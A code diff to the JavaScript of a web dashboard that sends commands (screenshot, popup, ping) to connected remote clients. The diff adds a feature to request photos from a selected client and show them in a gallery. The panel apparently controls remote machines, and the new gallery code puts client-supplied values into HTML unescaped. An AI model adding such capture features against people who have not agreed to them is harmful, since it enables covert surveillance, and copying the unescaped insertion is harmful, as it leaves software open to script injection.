@@ -57,6 +57,11 @@ function initializeWebSocket() {
         addLogEntry(`Screenshot received from ${data.client_id}`, 'success');
     });
     
+    socket.on('photo_received', function(data) {
+        addPhoto(data);
+        addLogEntry(`Photo received from ${data.client_id}`, 'success');
+    });
+    
     socket.on('popup_response', function(data) {
         addLogEntry(`Popup response from ${data.client_id}: ${JSON.stringify(data.response)}`, 'info');
     });
@@ -77,6 +82,7 @@ function initializeEventHandlers() {
     
     // Command buttons
     document.getElementById('cmd-screenshot').addEventListener('click', sendScreenshotCommand);
+    document.getElementById('cmd-photo').addEventListener('click', sendPhotoCommand);
     document.getElementById('cmd-popup').addEventListener('click', showPopupConfig);
     document.getElementById('cmd-ping').addEventListener('click', sendPingCommand);
     document.getElementById('send-popup').addEventListener('click', sendPopupCommand);
@@ -215,6 +221,7 @@ function refreshClients() {
 function updateCommandButtons() {
     const hasClient = selectedClient && connectedClients[selectedClient];
     document.getElementById('cmd-screenshot').disabled = !hasClient;
+    document.getElementById('cmd-photo').disabled = !hasClient;
     document.getElementById('cmd-popup').disabled = !hasClient;
     document.getElementById('cmd-ping').disabled = !hasClient;
 }
@@ -233,6 +240,23 @@ function sendScreenshotCommand() {
     })
     .catch(error => {
         addLogEntry(`Error sending screenshot command: ${error}`, 'error');
+    });
+}
+
+function sendPhotoCommand() {
+    if (!selectedClient) return;
+    
+    fetch('/api/command/photo', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ client_id: selectedClient })
+    })
+    .then(response => response.json())
+    .then(data => {
+        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
+    })
+    .catch(error => {
+        addLogEntry(`Error sending photo command: ${error}`, 'error');
     });
 }
 
@@ -320,6 +344,43 @@ function showScreenshotModal(url, filename) {
     document.getElementById('download-screenshot').download = filename;
     
     const modal = new bootstrap.Modal(document.getElementById('screenshotModal'));
+    modal.show();
+}
+
+// Photo functions
+function addPhoto(data) {
+    const container = document.getElementById('photos-container');
+    
+    // Remove "no photos" message
+    if (container.querySelector('p.text-muted')) {
+        container.innerHTML = '';
+    }
+    
+    const timestamp = new Date(data.timestamp * 1000).toLocaleString();
+    
+    const photoHtml = `
+        <div class="col-md-6 screenshot-item fade-in">
+            <div class="card">
+                <img src="${data.url}" class="screenshot-thumbnail" 
+                     onclick="showPhotoModal('${data.url}', '${data.filename}')"
+                     alt="Photo from ${data.client_id}">
+                <div class="screenshot-info">
+                    <strong>Client:</strong> ${data.client_id}<br>
+                    <strong>Time:</strong> ${timestamp}
+                </div>
+            </div>
+        </div>
+    `;
+    
+    container.insertAdjacentHTML('afterbegin', photoHtml);
+}
+
+function showPhotoModal(url, filename) {
+    document.getElementById('modal-photo').src = url;
+    document.getElementById('download-photo').href = url;
+    document.getElementById('download-photo').download = filename;
+    
+    const modal = new bootstrap.Modal(document.getElementById('photoModal'));
     modal.show();
 }
 
